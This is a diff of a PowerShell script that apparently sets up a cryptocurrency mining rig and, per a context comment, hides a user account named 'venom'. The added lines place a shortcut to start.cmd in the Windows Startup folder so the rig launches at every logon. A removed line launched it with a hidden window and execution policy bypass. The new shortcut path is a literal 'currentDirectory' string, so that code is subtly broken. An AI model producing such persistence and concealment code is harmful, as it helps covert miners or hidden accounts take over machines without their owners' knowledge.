@@ -89,11 +89,24 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New config.json file not found at the specified path."
 }
 
+# Define the path to the CMD file and the shortcut
+$CMDFilePath = "currentDirectory\start.cmd"
+$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start.lnk"
+
+# Create a new WScript.Shell COM object
+$WScriptShell = New-Object -ComObject WScript.Shell
+
+# Create a shortcut
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $CMDFilePath
+$Shortcut.Save()
+
+Write-Host "Shortcut created and added to startup successfully."
 
 
 
 # start rig
-powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
+./start.cmd
 
 
 # hide venom user
